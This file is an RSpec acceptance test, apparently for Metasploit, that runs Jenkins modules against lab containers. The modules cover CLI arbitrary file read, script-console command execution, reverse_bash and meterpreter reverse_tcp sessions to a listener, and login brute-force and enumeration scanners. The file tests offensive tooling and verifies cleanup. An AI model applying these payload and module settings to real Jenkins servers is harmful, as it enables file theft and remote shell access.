require 'acceptance_spec_helper'
require 'net/http'
require 'rbconfig'

RSpec.describe 'Native Jenkins module targets' do
  include_context 'module target'
  include_context 'wait_for_expect'

  profiles = JSON.parse(File.read('test/module_targets/jenkins/profiles.json'))
  fixtures = JSON.parse(File.read('test/module_targets/jenkins/fixtures.json'))
  file_module_name = 'auxiliary/gather/jenkins_cli_ampersand_arbitrary_file_read'

  before(:all) do
    argv = [RbConfig.ruby, 'test/module_targets/jenkins/native_probe.rb']
    stdout, stderr, status = Open3.capture3(*argv)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-jenkins-before.json'), stdout)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-jenkins-command.json'), JSON.pretty_generate(argv: argv, stderr: stderr, exitstatus: status.exitstatus))
    expect(status.success?).to be(true), stderr
    @native_profiles = JSON.parse(stdout).fetch('profiles')
    expect(@native_profiles.keys.sort).to eq(profiles.keys.sort)
    @native_routes = profiles.to_h do |service, _profile|
      paths = %w[script view/All/newJob asynchPeople/ systemInfo]
      routes = paths.to_h do |path|
        response = native_http(service, "/jenkins/#{path}")
        [path, { code: response.code.to_i, headers: response.to_hash, body: response.body.dup.force_encoding(Encoding::UTF_8) }]
      end
      [service, routes]
    end
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-jenkins-routes.json'), JSON.pretty_generate(@native_routes))
    server = target_exec('open', 'jcmd', '-l').lines.find { |line| line.include?('jenkins.war') }
    expect(server).not_to be_nil
    server_pid = server.split.first
    expect(server_pid).to match(/\A\d+\z/)
    properties = target_exec('open', 'jcmd', server_pid, 'VM.system_properties')
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-open-server-properties.txt'), properties)
    @server_properties = properties.lines.filter_map do |line|
      key, value = line.strip.split('=', 2)
      [key, value] if value
    end.to_h
    @native_account = target_exec('open', 'id', '-un').strip
    expect(native_http('unrelated', '/').body).to include('Module target')
  end

  profiles.except('open').each do |service, profile|
    it "checks the actual #{service} version boundary" do
      output = run_target_module(file_module, service, file_options, action: 'check')
      expect(output).to include("Found #{profile.fetch('vulnerable') ? 'exploitable' : 'non-exploitable'} version: #{profile.fetch('version')}")
    end
  end

  profiles.select { |_name, profile| profile.fetch('vulnerable') }.each_key do |service|
    %w[one two unicode long].each do |name|
      it "reads and loots actual #{name} file content twice on #{service}" do
        fixture = fixtures.fetch(name)
        expected = fixture.fetch('content').lines.first(2).map(&:chomp).join("\n")
        2.times do
          output = run_target_module(file_module, service, file_options.merge('FILE_PATH' => fixture.fetch('path')))
          path = output[/Results saved to: (.+)$/, 1]&.strip
          expect(path).not_to be_nil, output
          expect(File.expand_path(path)).to start_with(File.join(ENV.fetch('MSF_CFGROOT_CONFIG'), 'loot/'))
          expect(File.binread(path).force_encoding(Encoding::UTF_8)).to eq(expected)
        end
      end
    end

    %w[empty missing denied].each do |name|
      it "does not invent loot for the actual #{name} file on #{service}" do
        output = run_target_module(file_module, service, file_options.merge('FILE_PATH' => fixtures.fetch(name).fetch('path')), allow_errors: true)
        expect(output).not_to include('file contents retrieved', 'Results saved to:')
      end
    end
  end

  %w[weekly_fixed lts_fixed].each do |service|
    it "refuses ordinary execution on patched #{service}" do
      output = run_target_module(file_module, service, file_options, allow_errors: true)
      expect(output).to include('The target is not exploitable', 'Found non-exploitable version:')
      expect(output).not_to include('Results saved to:')
    end

    it "does not call literal unexpanded arguments file contents when forced on #{service}" do
      output = run_target_module(file_module, service, file_options.merge('ForceExploit' => true), allow_errors: true)
      expect(output).not_to include('file contents retrieved', 'Results saved to:')
    end
  end

  %w[open weekly_fixed].each do |service|
    it "detects the actual Jenkins script-console application on #{service}" do
      output = run_target_module(script_module, service, script_options('open'), action: 'check')
      expect(output).to include('The target application was detected')
    end
  end

  %w[open password token].each do |mode|
    it "executes a Unix command twice using #{mode} access with explicit operator cleanup" do
      prove_commands(mode, 'TARGET' => 2, 'PAYLOAD' => 'cmd/unix/generic')
    end

    %w[x64 x86].each do |arch|
      it "executes Linux #{arch} Bourne delivery twice using #{mode} access with operator cleanup" do
        prove_commands(mode, 'TARGET' => 1, 'PAYLOAD' => "linux/#{arch}/exec", 'CMDSTAGER::FLAVOR' => 'bourne')
      end
    end
  end

  { 'cmd/unix/reverse_bash' => 2, 'linux/x64/meterpreter/reverse_tcp' => 1 }.each do |payload, target|
    it "opens and uses #{payload} twice with actual session and cleanup proof" do
      service = 'weekly_fixed'
      original = temporary_files(service)
      proof_path = '/tmp/module-target-jenkins-session-proof'
      begin
        2.times do
          target_exec(service, 'test', '!', '-e', proof_path)
          output = run_target_module(script_module, service, script_options('token').merge(
            'TARGET' => target, 'PAYLOAD' => payload, 'CMDSTAGER::FLAVOR' => 'bourne',
            'LHOST' => listener_host, 'LPORT' => 4444, 'WfsDelay' => 15, 'DisablePayloadHandler' => false
          ), action: 'run -z')
          session_id = output[/(?:Command shell|Meterpreter) session (\d+) opened/, 1]
          expect(session_id).not_to be_nil, output
          meterpreter = payload.include?('meterpreter')
          command = meterpreter ? "execute -f /usr/bin/touch -a #{proof_path}" : "/usr/bin/touch #{proof_path}"
          flag = meterpreter ? '-C' : '-c'
          proof = console_command("sessions -i #{session_id} #{flag} #{command.inspect}")
          expect(proof).not_to match(/\[-\]|Exception|Unknown command/)
          wait_for_expect(15, 0.1) do
            expect(target_exec(service, 'sh', '-c', "if test -f #{proof_path}; then stat -c %U #{proof_path}; fi").strip).to eq('jenkins')
          end
          console_command('sessions -K')
          target_exec(service, 'rm', '-f', proof_path)
          wait_for_expect(15, 0.2) { expect(temporary_files(service)).to eq(original) }
        end
      ensure
        operator_cleanup(service, original, proof_path)
      end
    end
  end

  {
    'incorrect password' => { 'PASSWORD' => 'wrong-password' },
    'absent user' => { 'USERNAME' => 'missing-user' },
    'incorrect API token' => { 'API_TOKEN' => '1100000000000000000000000000000001', 'PASSWORD' => nil }
  }.each do |label, options|
    it "refuses script execution with #{label}" do
      service = 'weekly_fixed'
      proof_path = '/tmp/module-target-jenkins-denied-proof'
      target_exec(service, 'test', '!', '-e', proof_path)
      output = run_target_module(script_module, service, script_options('password').merge(
        'TARGET' => 2, 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => "touch #{proof_path}",
        'DisablePayloadHandler' => true, 'AllowNoCleanup' => true, 'WfsDelay' => 0
      ).merge(options), allow_errors: true)
      expect(output).to match(/Incorrect credentials|Login failed/)
      expect(target_exec(service, 'test', '!', '-e', proof_path)).to eq('')
    end
  end

  [file_module_name, 'exploit/multi/http/jenkins_script_console'].each do |fullname|
    it "does not identify unrelated real HTTP as #{fullname}" do
      output = run_target_module(fullname, 'unrelated', { 'SSL' => false, 'TARGETURI' => '/' }, action: 'check', allow_errors: true)
      expect(output).to include('The target is not exploitable')
    end
  end

  it 'authenticates one configured Jenkins login candidate twice' do
    2.times do
      output = run_target_module('auxiliary/scanner/http/jenkins_login', 'weekly_fixed', login_options)
      expect(output).to include('Login Successful: module_target:module-target-password')
    end
  end

  { 'wrong password' => { 'PASSWORD' => 'wrong-password' }, 'absent username' => { 'USERNAME' => 'missing-user' }, 'blank password' => { 'PASSWORD' => nil, 'BLANK_PASSWORDS' => true } }.each do |label, options|
    it "rejects the #{label} login candidate" do
      output = run_target_module('auxiliary/scanner/http/jenkins_login', 'weekly_fixed', login_options.merge(options), allow_errors: true)
      expect(output).to include('LOGIN FAILED:')
      expect(output).not_to include('Login Successful:')
    end
  end

  it 'does not accept login credentials on unrelated real HTTP' do
    output = run_target_module('auxiliary/scanner/http/jenkins_login', 'unrelated', login_options.merge('TARGETURI' => '/'), allow_errors: true)
    expect(output).to include('Unable to locate the Jenkins login path')
    expect(output).not_to include('Login Successful:')
  end

  profiles.each do |service, profile|
    it "enumerates the actual version and anonymous route policy on #{service}" do
      output = run_target_module('auxiliary/scanner/http/jenkins_enum', service, { 'SSL' => false, 'TARGETURI' => '/jenkins/' })
      expect(output).to include("Jenkins Version #{profile.fetch('version')}")
      @native_routes.fetch(service).each do |path, response|
        expect(output).to include("/jenkins/#{path}")
        expect(output).to include("(#{response.fetch(:code)})")
      end
      if service == 'open'
        expect(@server_properties.fetch('user.name')).to eq(@native_account)
        { 'os.name' => 'OS:', 'os.version' => 'OS Version:', 'os.arch' => 'Arch:', 'user.name' => 'User:', 'user.home' => 'Home Directory:', 'user.language' => 'Language:' }.each do |property, label|
          expect(output).to include("#{label} #{@server_properties.fetch(property)}")
        end
      end
    end
  end

  it 'does not enumerate unrelated HTTP as Jenkins' do
    output = run_target_module('auxiliary/scanner/http/jenkins_enum', 'unrelated', { 'SSL' => false, 'TARGETURI' => '/' }, allow_errors: true)
    expect(output).to include('does not seem to be Jenkins')
    expect(output).not_to include('Jenkins Version')
  end

  define_method(:file_module) { file_module_name }

  def script_module
    'exploit/multi/http/jenkins_script_console'
  end

  def file_options
    path = JSON.parse(File.read('test/module_targets/jenkins/fixtures.json')).fetch('two').fetch('path')
    { 'SSL' => false, 'TARGETURI' => '/jenkins/', 'FILE_PATH' => path }
  end

  def login_options
    {
      'SSL' => false, 'TARGETURI' => '/jenkins/', 'USERNAME' => 'module_target', 'PASSWORD' => 'module-target-password',
      'USER_FILE' => nil, 'PASS_FILE' => nil, 'USERPASS_FILE' => nil, 'USER_AS_PASS' => false,
      'BLANK_PASSWORDS' => false, 'ANONYMOUS_LOGIN' => false, 'STOP_ON_SUCCESS' => true, 'BRUTEFORCE_SPEED' => 5,
      'DB_ALL_CREDS' => false, 'DB_ALL_USERS' => false, 'DB_ALL_PASS' => false
    }
  end

  def script_options(mode)
    {
      'SSL' => false, 'TARGETURI' => '/jenkins/', 'USERNAME' => mode == 'open' ? nil : 'module_target',
      'PASSWORD' => mode == 'password' ? 'module-target-password' : nil,
      'API_TOKEN' => mode == 'token' ? '1100000000000000000000000000000000' : nil
    }
  end

  def prove_commands(mode, options)
    service = mode == 'open' ? 'open' : 'weekly_fixed'
    proof_path = '/tmp/module-target-jenkins-payload-proof'
    original = temporary_files(service)
    begin
      2.times do
        target_exec(service, 'test', '!', '-e', proof_path)
        output = run_target_module(script_module, service, script_options(mode).merge(options).merge(
          'CMD' => "printf module-target-jenkins-payload-proof > #{proof_path}",
          'DisablePayloadHandler' => true, 'AllowNoCleanup' => true, 'WfsDelay' => 0
        ))
        expect(output).to match(/Sending (?:payload|Linux stager)/)
        wait_for_expect(15, 0.1) do
          expect(target_exec(service, 'sh', '-c', "if test -f #{proof_path}; then cat #{proof_path}; fi")).to eq('module-target-jenkins-payload-proof')
        end
        operator_cleanup(service, original, proof_path)
        expect(temporary_files(service)).to eq(original)
      end
    ensure
      operator_cleanup(service, original, proof_path)
    end
  end

  def temporary_files(service)
    target_exec(service, 'find', '/tmp', '-maxdepth', '1', '-type', 'f', '-print').lines.map(&:strip).sort
  end

  def operator_cleanup(service, original, proof_path)
    added = temporary_files(service) - original
    File.open(File.join(target_runtime.fetch('artifacts'), 'operator-cleanup.jsonl'), 'a') do |log|
      log.puts(JSON.generate(service: service, files: added))
    end
    target_exec(service, 'rm', '-f', '--', *added, proof_path)
  end

  def native_http(service, path)
    endpoint = target_endpoint(service)
    http = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    http.open_timeout = 5
    http.read_timeout = 10
    http.get(path)
  end
end
